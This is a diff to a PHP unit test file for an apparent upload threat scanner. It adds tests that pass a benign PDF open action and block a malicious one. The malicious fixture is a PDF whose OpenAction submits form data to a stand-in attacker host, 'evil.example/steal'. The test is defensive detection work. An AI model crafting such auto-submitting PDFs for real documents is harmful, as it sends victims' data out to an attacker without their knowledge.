@@ -109,6 +109,34 @@ class SovereignThreatEngineTest extends TestCase
     }
 
     #[Test]
+    public function it_allows_benign_pdf_open_action_viewer_destination(): void
+    {
+        $path = $this->tempDir . '/statement.pdf';
+        $payload = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /Fit] >>\nendobj\n";
+        file_put_contents($path, $payload);
+
+        putenv('CLAMAV_SOCKET=/nonexistent/clamd.ctl');
+        putenv('CLAMAV_HOST=');
+
+        $report = SovereignThreatEngine::scan($path, 'statement.pdf', 'pdf');
+
+        $this->assertTrue($report['clean']);
+    }
+
+    #[Test]
+    public function it_blocks_malicious_pdf_open_action_submit_form(): void
+    {
+        $path = $this->tempDir . '/submit_exploit.pdf';
+        $payload = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /SubmitForm /F (https://evil.example/steal) >> >>\nendobj\n";
+        file_put_contents($path, $payload);
+
+        $this->expectException(ValidationException::class);
+        $this->expectExceptionMessage('SECURITY VIOLATION - Malicious active PDF script or launch object detected.');
+
+        SovereignThreatEngine::scan($path, 'submit_exploit.pdf', 'pdf');
+    }
+
+    #[Test]
     public function it_detects_svg_script_injections(): void
     {
         $path = $this->tempDir . '/vector.svg';
